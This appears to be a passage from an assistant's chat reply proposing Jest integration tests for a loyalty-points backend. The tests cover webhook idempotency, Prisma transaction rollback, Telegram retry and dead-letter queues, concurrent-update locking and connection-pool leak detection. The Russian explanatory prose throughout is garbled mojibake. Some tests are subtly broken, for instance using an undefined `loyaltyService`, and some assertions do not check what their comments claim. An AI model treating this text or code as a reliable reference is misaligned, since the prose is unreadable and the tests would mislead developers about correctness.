      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    await request(app.getHttpServer()).post('/webhooks/transaction').send(webhook1);
    await request(app.getHttpServer()).post('/webhooks/transaction').send(webhook2);

    // Both should be processed
    const ballTransactions = await prisma.ballTransaction.findMany();
    expect(ballTransactions).toHaveLength(2);

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1300); // 1000 + 100 + 200
  });

  // 6. Redis Cache Expiration (after 24 hours)
  it('should allow reprocessing after cache expiration', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-EXPIRE',
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send first webhook
    await request(app.getHttpServer()).post('/webhooks/transaction').send(webhook);

    // Manually expire Redis cache (simulate 24 hours)
    const cacheKey = `idempotency:tenant-1:IIKO_CLOUD:CHK-EXPIRE`;
    await redis.del(cacheKey);

    // Send webhook again (after cache expired)
    const response2 = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook);

    // Should be processed as new (not duplicate)
    expect(response2.body.alreadyProcessed).toBeUndefined();

    // But database constraint should prevent duplicate
    const ballTransactions = await prisma.ballTransaction.findMany({
      where: { sourceId: 'CHK-EXPIRE' },
    });
    expect(ballTransactions).toHaveLength(1); // Still only 1 (DB constraint)
  });

  // 7. Distributed Lock Test (Redis)
  it('should use distributed lock to prevent race conditions', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-LOCK',
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send 5 concurrent webhooks
    const promises = Array(5).fill(null).map(() =>
      request(app.getHttpServer()).post('/webhooks/transaction').send(webhook)
    );

    await Promise.all(promises);

    // Check that lock was used (only 1 processed)
    const lockKey = `lock:guest:card-1`;
    const lockExists = await redis.exists(lockKey);
    expect(lockExists).toBe(0); // Lock released after processing
  });
});
```


***

### **7. Database Transactions - rollback ะฟัะธ ะพัะธะฑะบะต?**

**ะะพะฝัะตะบัั:** ะะฐัะธัะปะตะฝะธะต ะฑะฐะปะปะพะฒ = multi-step process:

1. Create BallTransaction
2. Update GuestCard balance
3. Create Notification
4. Log Audit

**ะะพะฟัะพั:** ะงัะพ ะฟัะพะธััะพะดะธั ะตัะปะธ ัะฐะณ 3 fail?

- A) Partial commit (ะฑะฐะปะปั ะฝะฐัะธัะปะตะฝั, notification ะฝะต ะพัะฟัะฐะฒะปะตะฝ) - โ BAD
- B) Full rollback (ะฝะธัะตะณะพ ะฝะต ะธะทะผะตะฝะธะปะพัั) - โ GOOD
- C) Retry step 3 ะพัะดะตะปัะฝะพ
- D) B + ะบะฐะบ ัะตััะธัะพะฒะฐัั rollback ะฒ integration tests?

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Partial commit = data inconsistency (ะฑะฐะปะปั ะฝะฐัะธัะปะตะฝั, ะฝะพ notification ะฝะต ะพัะฟัะฐะฒะปะตะฝ)
- Prisma `$transaction` ะณะฐัะฐะฝัะธััะตั atomicity
- Retry ะดะพะปะถะตะฝ ะฑััั ะฝะฐ ััะพะฒะฝะต queue (BullMQ), ะฝะต ะฒะฝัััะธ transaction

**ะะะะะะะะฆะะฏ:**

```typescript
describe('Ball Crediting - Transaction Rollback (Integration)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;
  let notificationService: NotificationService;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
    notificationService = app.get(NotificationService);
  });

  beforeEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
    await prisma.auditLog.deleteMany();

    // Seed test data
    await prisma.guestCard.create({
      data: {
        id: 'card-1',
        userId: 'user-1',
        tenantId: 'tenant-1',
        totalBalance: 1000,
      },
    });
  });

  // 1. Happy Path - All Steps Succeed
  it('should commit all steps successfully', async () => {
    const result = await loyaltyService.creditBalls({
      guestCardId: 'card-1',
      amount: 500,
      source: 'POS_WEBHOOK',
      sourceId: 'CHK-123',
    });

    expect(result.success).toBe(true);

    // Check all steps completed
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-123' },
    });
    expect(ballTx.amount).toBe(500);

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1500);

    const audit = await prisma.auditLog.findFirst({
      where: { action: 'BALLS_CREDITED' },
    });
    expect(audit).toBeTruthy();
  });

  // 2. Notification Failure - Should Rollback Everything
  it('should rollback if notification fails', async () => {
    // Mock notification failure
    jest.spyOn(notificationService, 'send').mockRejectedValue(new Error('Telegram API down'));

    await expect(
      loyaltyService.creditBalls({
        guestCardId: 'card-1',
        amount: 500,
        source: 'POS_WEBHOOK',
        sourceId: 'CHK-456',
      })
    ).rejects.toThrow('Telegram API down');

    // Check that NOTHING was committed
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-456' },
    });
    expect(ballTx).toBeNull(); // Rolled back!

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1000); // Unchanged!

    const audit = await prisma.auditLog.findFirst({
      where: { action: 'BALLS_CREDITED', targetId: 'CHK-456' },
    });
    expect(audit).toBeNull(); // Rolled back!
  });

  // 3. Database Constraint Violation - Should Rollback
  it('should rollback if duplicate sourceId', async () => {
    // Create existing transaction
    await prisma.ballTransaction.create({
      data: {
        id: '1',
        guestCardId: 'card-1',
        amount: 500,
        source: 'POS_WEBHOOK',
        sourceId: 'CHK-DUPLICATE',
        status: 'COMPLETED',
        earnedAt: new Date(),
      },
    });

    // Try to create duplicate
    await expect(
      loyaltyService.creditBalls({
        guestCardId: 'card-1',
        amount: 500,
        source: 'POS_WEBHOOK',
        sourceId: 'CHK-DUPLICATE', // Duplicate!
      })
    ).rejects.toThrow(/Unique constraint/);

    // Check balance unchanged
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1000); // NOT 1500!
  });

  // 4. Concurrent Transactions - Isolation Level
  it('should handle concurrent balance updates correctly', async () => {
    // Run 5 concurrent credit operations
    const promises = Array(5).fill(null).map((_, i) =>
      loyaltyService.creditBalls({
        guestCardId: 'card-1',
        amount: 100,
        source: 'POS_WEBHOOK',
        sourceId: `CHK-${i}`,
      })
    );

    await Promise.all(promises);

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1500); // 1000 + (5 * 100) = 1500
  });

  // 5. Partial Rollback - Nested Transactions
  it('should rollback nested transaction on failure', async () => {
    await prisma.$transaction(async (tx) => {
      // Step 1: Credit balls (succeeds)
      await tx.ballTransaction.create({
        data: {
          id: '1',
          guestCardId: 'card-1',
          amount: 500,
          source: 'POS_WEBHOOK',
          sourceId: 'CHK-NESTED',
          status: 'COMPLETED',
          earnedAt: new Date(),
        },
      });

      // Step 2: Update balance (succeeds)
      await tx.guestCard.update({
        where: { id: 'card-1' },
        data: { totalBalance: { increment: 500 } },
      });

      // Step 3: Create audit log (fails)
      throw new Error('Audit log failed');
    }).catch(() => {
      // Expected to fail
    });

    // Check that ALL steps rolled back
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-NESTED' },
    });
    expect(ballTx).toBeNull();

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1000); // Unchanged!
  });

  // 6. Long-Running Transaction - Timeout
  it('should timeout long-running transaction', async () => {
    jest.setTimeout(10000);

    await expect(
      prisma.$transaction(
        async (tx) => {
          await tx.ballTransaction.create({
            data: {
              id: '1',
              guestCardId: 'card-1',
              amount: 500,
              source: 'POS_WEBHOOK',
              sourceId: 'CHK-TIMEOUT',
              status: 'COMPLETED',
              earnedAt: new Date(),
            },
          });

          // Simulate long operation (6 seconds)
          await new Promise(resolve => setTimeout(resolve, 6000));
        },
        {
          maxWait: 5000, // 5 second timeout
          timeout: 5000,
        }
      )
    ).rejects.toThrow(/Transaction timeout/);

    // Check rollback
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-TIMEOUT' },
    });
    expect(ballTx).toBeNull();
  });
});
```


***

### **8. External Service Failures - resilience?**

**ะะพะฝัะตะบัั:** Telegram API ะฒะตัะฝัะป 503 Service Unavailable.

```typescript
// Send notification via Telegram
sendTelegramNotification(guestId: string, message: string)
```

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั retry logic?

- A) Mock Telegram API โ ะฒัะตะณะดะฐ ะฒะพะทะฒัะฐัะฐะตั 503
- B) Mock โ ะฟะตัะฒัะต 2 ะฟะพะฟััะบะธ 503, ััะตััั 200 OK
- C) B + ะฟัะพะฒะตัะธัั exponential backoff delays
- D) C + ะฟัะพะฒะตัะธัั Dead Letter Queue (DLQ) ะฟะพัะปะต 3 failures

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Exponential backoff ะฟัะตะดะพัะฒัะฐัะฐะตั overwhelming external services
- DLQ ะบัะธัะธัะตะฝ ะดะปั manual retry failed notifications
- Circuit breaker ะทะฐัะธัะฐะตั ะพั cascade failures

**ะะะะะะะะฆะะฏ:**

```typescript
describe('Telegram Notification - Retry Logic (Integration)', () => {
  let app: INestApplication;
  let queue: Queue;
  let telegramService: TelegramService;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    queue = app.get('BullQueue_notifications');
    telegramService = app.get(TelegramService);
  });

  beforeEach(async () => {
    await queue.clean(0, 'completed');
    await queue.clean(0, 'failed');
  });

  // 1. Success on First Attempt
  it('should send notification successfully on first attempt', async () => {
    jest.spyOn(telegramService, 'sendMessage').mockResolvedValue({ ok: true });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    });

    await job.finished();

    expect(telegramService.sendMessage).toHaveBeenCalledTimes(1);
    expect(job.returnvalue.success).toBe(true);
  });

  // 2. Retry on 503 Error
  it('should retry on 503 Service Unavailable', async () => {
    let attempts = 0;
    
    jest.spyOn(telegramService, 'sendMessage').mockImplementation(async () => {
      attempts++;
      if (attempts <= 2) {
        throw { response: { status: 503 } }; // Fail first 2 attempts
      }
      return { ok: true }; // Succeed on 3rd attempt
    });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    });

    await job.finished();

    expect(attempts).toBe(3); // 1 initial + 2 retries
    expect(job.returnvalue.success).toBe(true);
  });

  // 3. Exponential Backoff Delays
  it('should use exponential backoff between retries', async () => {
    const timestamps: number[] = [];

    jest.spyOn(telegramService, 'sendMessage').mockImplementation(async () => {
      timestamps.push(Date.now());
      
      if (timestamps.length <= 2) {
        throw { response: { status: 503 } };
      }
      return { ok: true };
    });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    }, {
      attempts: 3,
      backoff: {
        type: 'exponential',
        delay: 1000, // 1s, 2s, 4s
      },
    });

    await job.finished();

    // Check delays between attempts
    const delay1 = timestamps[1] - timestamps[0];
    const delay2 = timestamps[2] - timestamps[1];

    expect(delay1).toBeGreaterThanOrEqual(1000); // ~1s
    expect(delay1).toBeLessThan(1500);

    expect(delay2).toBeGreaterThanOrEqual(2000); // ~2s
    expect(delay2).toBeLessThan(3000);
  });

  // 4. Dead Letter Queue after Max Retries
  it('should move to DLQ after 3 failed attempts', async () => {
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue({
      response: { status: 503 },
    });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    }, {
      attempts: 3,
      backoff: { type: 'exponential', delay: 100 },
    });

    await expect(job.finished()).rejects.toThrow();

    // Check DLQ
    const dlqRecord = await prisma.notificationDLQ.findFirst({
      where: { recipientId: 'user-1' },
    });

    expect(dlqRecord).toBeTruthy();
    expect(dlqRecord.attempts).toBe(3);
    expect(dlqRecord.errorMessage).toContain('503');
    expect(dlqRecord.status).toBe('PENDING');
  });

  // 5. Circuit Breaker - Stop Sending After Many Failures
  it('should trigger circuit breaker after multiple failures', async () => {
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue({
      response: { status: 503 },
    });

    // Send 10 notifications (all will fail)
    const jobs = Array(10).fill(null).map((_, i) =>
      queue.add('send-telegram', {
        guestId: `user-${i}`,
        message: 'Test notification',
      }, {
        attempts: 1, // No retries for this test
      })
    );

    await Promise.allSettled(jobs.map(j => j.finished()));

    // Check circuit breaker state
    const circuitBreaker = app.get('TelegramCircuitBreaker');
    expect(circuitBreaker.isOpen()).toBe(true); // Circuit opened after 10 failures

    // Next job should fail immediately (circuit open)
    const job11 = await queue.add('send-telegram', {
      guestId: 'user-11',
      message: 'Test notification',
    });

    await expect(job11.finished()).rejects.toThrow('Circuit breaker is open');
    expect(telegramService.sendMessage).not.toHaveBeenCalledWith(
      expect.objectContaining({ guestId: 'user-11' })
    );
  });

  // 6. Fallback to SMS on Telegram Failure
  it('should fallback to SMS if Telegram fails', async () => {
    const smsService = app.get(SmsService);
    
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue({
      response: { status: 503 },
    });
    
    jest.spyOn(smsService, 'send').mockResolvedValue({ success: true });

    const job = await queue.add('send-notification', {
      guestId: 'user-1',
      phone: '+79991234567',
      message: 'Test notification',
      channels: ['TELEGRAM', 'SMS'], // Fallback chain
    }, {
      attempts: 1, // No retries, use fallback instead
    });

    await job.finished();

    // Telegram failed, SMS succeeded
    expect(telegramService.sendMessage).toHaveBeenCalledTimes(1);
    expect(smsService.send).toHaveBeenCalledTimes(1);
    expect(job.returnvalue.channel).toBe('SMS');
  });

  // 7. Rate Limiting - 429 Too Many Requests
  it('should handle 429 rate limit errors', async () => {
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue({
      response: { 
        status: 429,
        headers: { 'retry-after': '5' }, // Retry after 5 seconds
      },
    });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    }, {
      attempts: 2,
    });

    await expect(job.finished()).rejects.toThrow();

    // Check that we waited 5 seconds before retry
    const retryDelay = job.opts.backoff.delay;
    expect(retryDelay).toBeGreaterThanOrEqual(5000);
  });
});
```


***

### **9. Concurrent Webhook Processing - race conditions?**

**ะะพะฝัะตะบัั:** 2 POS ัะตัะผะธะฝะฐะปะฐ ะพะดะฝะพะฒัะตะผะตะฝะฝะพ ะพัะฟัะฐะฒะปััั webhooks ะดะปั ะพะดะฝะพะณะพ ะณะพััั.

```
Thread 1: Credit 100 balls (balance: 500 โ 600)
Thread 2: Credit 200 balls (balance: 500 โ 700) โ Wrong! Should be 800
```

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั concurrent processing?

- A) Unit test ั locks (optimistic/pessimistic locking)
- B) Integration test: ะทะฐะฟัััะธัั 10 webhooks ะฟะฐัะฐะปะปะตะปัะฝะพ
- C) B + ะฟัะพะฒะตัะธัั ัะธะฝะฐะปัะฝัะน ะฑะฐะปะฐะฝั = ััะผะผะฐ ะฒัะตั ะฝะฐัะธัะปะตะฝะธะน
- D) C + stress test (100+ concurrent webhooks)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Race conditions = ัะตะฐะปัะฝะฐั ะฟัะพะฑะปะตะผะฐ ะฒ production ะฟัะธ high load
- PostgreSQL `FOR UPDATE` ะธะปะธ Redis distributed locks ะพะฑัะทะฐัะตะปัะฝั
- Stress test ะฝะฐัะพะดะธั edge cases (deadlocks, timeouts)

**ะะะะะะะะฆะะฏ:**

```typescript
describe('Concurrent Webhook Processing - Race Conditions (Integration)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.posTransaction.deleteMany();
    await prisma.guestCard.deleteMany();

    // Seed test data
    await prisma.guestCard.create({
      data: {
        id: 'card-1',
        userId: 'user-1',
        tenantId: 'tenant-1',
        totalBalance: 1000,
        phone: '+79991234567',
      },
    });
  });

  // 1. Sequential Processing - Baseline
  it('should process webhooks sequentially (baseline)', async () => {
    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-SEQ-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    // Process sequentially
    for (const webhook of webhooks) {
      await request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook);
    }

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(2000); // 1000 + (10 * 100) = 2000
  });

  // 2. Concurrent Processing - 10 Webhooks
  it('should handle 10 concurrent webhooks correctly', async () => {
    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-CONCURRENT-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    // Process concurrently
    const promises = webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    );

    await Promise.all(promises);

    // Check final balance (should be same as sequential)
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(2000); // 1000 + (10 * 100) = 2000

    // Check all transactions created
    const ballTransactions = await prisma.ballTransaction.findMany();
    expect(ballTransactions).toHaveLength(10);
  });

  // 3. Lost Update Problem - Without Locking
  it('should demonstrate lost update without locking', async () => {
    // Disable locking for this test (to show the problem)
    process.env.DISABLE_LOCKING = 'true';

    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-NO-LOCK-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    await Promise.all(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    // Without locking, balance will be incorrect
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBeLessThan(2000); // Lost updates!

    process.env.DISABLE_LOCKING = 'false';
  });

  // 4. Pessimistic Locking - SELECT FOR UPDATE
  it('should use pessimistic locking (SELECT FOR UPDATE)', async () => {
    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-PESSIMISTIC-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    await Promise.all(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    // With pessimistic locking, balance should be correct
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(2000);

    // Check query logs for "FOR UPDATE"
    const queryLog = await prisma.$queryRaw`
      SELECT query FROM pg_stat_statements 
      WHERE query LIKE '%FOR UPDATE%'
      LIMIT 1
    `;
    expect(queryLog).toBeTruthy();
  });

  // 5. Optimistic Locking - Version Field
  it('should use optimistic locking with version field', async () => {
    // Add version field to GuestCard
    await prisma.guestCard.update({
      where: { id: 'card-1' },
      data: { version: 1 },
    });

    const webhooks = Array(5).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-OPTIMISTIC-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    const results = await Promise.allSettled(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    // Some requests should fail with version mismatch
    const conflicts = results.filter(r => r.status === 'rejected');
    expect(conflicts.length).toBeGreaterThan(0);

    // But final balance should still be correct (with retries)
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBeGreaterThanOrEqual(1500);
  });

  // 6. Distributed Lock - Redis
  it('should use Redis distributed lock', async () => {
    const redis = app.get('REDIS');

    const webhooks = Array(10).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-REDIS-LOCK-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    await Promise.all(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(2000);

    // Check that locks were released
    const lockKey = 'lock:guest:card-1';
    const lockExists = await redis.exists(lockKey);
    expect(lockExists).toBe(0);
  });

  // 7. Stress Test - 100 Concurrent Webhooks
  it('should handle 100 concurrent webhooks (stress test)', async () => {
    jest.setTimeout(60000); // 60 seconds timeout

    const webhooks = Array(100).fill(null).map((_, i) => ({
      posSystem: 'IIKO_CLOUD',
      posCheckId: `CHK-STRESS-${i}`,
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    }));

    const startTime = Date.now();

    await Promise.all(webhooks.map(webhook =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    ));

    const endTime = Date.now();
    const duration = endTime - startTime;

    console.log(`Processed 100 webhooks in ${duration}ms`);

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(11000); // 1000 + (100 * 100) = 11000

    // Check performance (should be < 30 seconds)
    expect(duration).toBeLessThan(30000);
  });

  // 8. Deadlock Detection
  it('should handle deadlocks gracefully', async () => {
    // Create 2 guest cards
    await prisma.guestCard.create({
      data: {
        id: 'card-2',
        userId: 'user-2',
        tenantId: 'tenant-1',
        totalBalance: 1000,
        phone: '+79991234568',
      },
    });

    // Simulate deadlock scenario:
    // Thread 1: Lock card-1, then card-2
    // Thread 2: Lock card-2, then card-1
    const promise1 = prisma.$transaction(async (tx) => {
      await tx.guestCard.update({
        where: { id: 'card-1' },
        data: { totalBalance: { increment: 100 } },
      });
      await new Promise(resolve => setTimeout(resolve, 100));
      await tx.guestCard.update({
        where: { id: 'card-2' },
        data: { totalBalance: { increment: 100 } },
      });
    });

    const promise2 = prisma.$transaction(async (tx) => {
      await tx.guestCard.update({
        where: { id: 'card-2' },
        data: { totalBalance: { increment: 100 } },
      });
      await new Promise(resolve => setTimeout(resolve, 100));
      await tx.guestCard.update({
        where: { id: 'card-1' },
        data: { totalBalance: { increment: 100 } },
      });
    });

    // One should succeed, one should fail with deadlock
    const results = await Promise.allSettled([promise1, promise2]);
    
    const succeeded = results.filter(r => r.status === 'fulfilled');
    const failed = results.filter(r => r.status === 'rejected');

    expect(succeeded).toHaveLength(1);
    expect(failed).toHaveLength(1);
    expect(failed[0].reason.message).toContain('deadlock');
  });
});
```


***

ะัะพะดะพะปะถะฐั ั ะฒะพะฟัะพัะฐะผะธ **10-15**? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **10. Database Connection Pool - leak detection?**

**ะะพะฝัะตะบัั:** Prisma connection pool = 10 connections. ะฃัะตัะบะฐ โ production ะฟะฐะดะฐะตั.

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั connection leaks?

- A) Unit test (ะฝะตะฒะพะทะผะพะถะฝะพ)
- B) Integration test: ะฒัะฟะพะปะฝะธัั 100 queries ะฟะพะดััะด
- C) B + ะผะพะฝะธัะพัะธัั active connections ะฒ PostgreSQL
- D) C + automated test ะฒ CI/CD (fail ะตัะปะธ leak ะพะฑะฝะฐััะถะตะฝ)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Connection leaks = ัะฐััะฐั ะฟัะธัะธะฝะฐ production outages
- Real database queries ะฝัะถะฝั ะดะปั ะพะฑะฝะฐััะถะตะฝะธั ััะตัะตะบ
- Automated monitoring ะฟัะตะดะพัะฒัะฐัะฐะตั regression

**ะะะะะะะะฆะะฏ:**

```typescript
describe('Database Connection Pool - Leak Detection (Integration)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  afterAll(async () => {
    await app.close();
  });

  // Helper: Get active connections from PostgreSQL
  async function getActiveConnections(): Promise<number> {
    const result = await prisma.$queryRaw<[{ count: bigint }]>`
      SELECT COUNT(*) as count
      FROM pg_stat_activity
      WHERE datname = current_database()
        AND state = 'active'
        AND pid != pg_backend_pid();
    `;
    return Number(result[0].count);
  }

  // Helper: Get total connections
  async function getTotalConnections(): Promise<number> {
    const result = await prisma.$queryRaw<[{ count: bigint }]>`
      SELECT COUNT(*) as count
      FROM pg_stat_activity
      WHERE datname = current_database()
        AND pid != pg_backend_pid();
    `;
    return Number(result[0].count);
  }

  // 1. Baseline - Check Initial Connections
  it('should have minimal connections at start', async () => {
    const connections = await getTotalConnections();
    
    expect(connections).toBeLessThanOrEqual(2); // Prisma connection + test connection
  });

  // 2. Sequential Queries - No Leak
  it('should not leak connections with sequential queries', async () => {
    const initialConnections = await getTotalConnections();

    // Run 100 queries sequentially
    for (let i = 0; i < 100; i++) {
      await prisma.guestCard.findMany({ take: 10 });
    }

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 1);
  });

  // 3. Concurrent Queries - Pool Saturation
  it('should handle concurrent queries without leaking', async () => {
    const initialConnections = await getTotalConnections();

    // Run 50 queries concurrently (exceeds pool size)
    const promises = Array(50).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    await Promise.all(promises);

    // Wait for connections to be released
    await new Promise(resolve => setTimeout(resolve, 1000));

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 2);
  });

  // 4. Transaction Leak Detection
  it('should not leak connections from transactions', async () => {
    const initialConnections = await getTotalConnections();

    // Run 20 transactions
    for (let i = 0; i < 20; i++) {
      await prisma.$transaction(async (tx) => {
        await tx.guestCard.findMany({ take: 10 });
        await tx.ballTransaction.findMany({ take: 10 });
      });
    }

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 1);
  });

  // 5. Failed Transaction - Connection Released
  it('should release connection even if transaction fails', async () => {
    const initialConnections = await getTotalConnections();

    // Run failing transaction
    await expect(
      prisma.$transaction(async (tx) => {
        await tx.guestCard.findMany();
        throw new Error('Transaction failed');
      })
    ).rejects.toThrow('Transaction failed');

    // Wait for connection release
    await new Promise(resolve => setTimeout(resolve, 500));

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 1);
  });

  // 6. Long-Running Query - Timeout
  it('should timeout long-running queries', async () => {
    jest.setTimeout(15000);

    const initialConnections = await getTotalConnections();

    // Simulate long-running query
    await expect(
      prisma.$queryRaw`SELECT pg_sleep(10)` // 10 seconds
    ).rejects.toThrow(/timeout|cancelled/);

    const finalConnections = await getTotalConnections();

    expect(finalConnections).toBeLessThanOrEqual(initialConnections + 1);
  });

  // 7. Stress Test - Connection Pool Exhaustion
  it('should handle connection pool exhaustion gracefully', async () => {
    jest.setTimeout(30000);

    // Prisma pool size = 10
    // Run 100 queries concurrently (10x pool size)
    const promises = Array(100).fill(null).map((_, i) =>
      prisma.guestCard.findMany({ take: 10 }).catch(err => ({
        error: true,
        message: err.message,
      }))
    );

    const results = await Promise.all(promises);

    // Some queries should queue (not fail)
    const errors = results.filter((r: any) => r.error);
    expect(errors.length).toBe(0); // No errors (queued properly)

    // Wait for all connections to be released
    await new Promise(resolve => setTimeout(resolve, 2000));

    const finalConnections = await getTotalConnections();
    expect(finalConnections).toBeLessThanOrEqual(12);
  });

  // 8. Automated Leak Detection - CI/CD
  it('should detect connection leaks automatically', async () => {
    const initialConnections = await getTotalConnections();
    const maxAllowedConnections = initialConnections + 5;

    // Run realistic workload
    const promises = [];
    
    for (let i = 0; i < 50; i++) {
      promises.push(
        prisma.$transaction(async (tx) => {
          await tx.guestCard.findMany({ take: 10 });
          await tx.ballTransaction.create({
            data: {
              id: `tx-${i}`,
              guestCardId: 'card-1',
              amount: 100,
              source: 'TEST',
              sourceId: `test-${i}`,
              status: 'COMPLETED',
              earnedAt: new Date(),
            },
          });
        })
      );
    }

    await Promise.all(promises);

    // Monitor connections during execution
    const peakConnections = await getTotalConnections();
    
    console.log(`Peak connections: ${peakConnections}`);
    console.log(`Max allowed: ${maxAllowedConnections}`);

    // Fail test if connections exceed threshold
    if (peakConnections > maxAllowedConnections) {
      throw new Error(
        `Connection leak detected! Peak: ${peakConnections}, Max: ${maxAllowedConnections}`
      );
    }

    expect(peakConnections).toBeLessThanOrEqual(maxAllowedConnections);
  });

  // 9. PgBouncer Integration
  it('should work correctly with PgBouncer connection pooling', async () => {
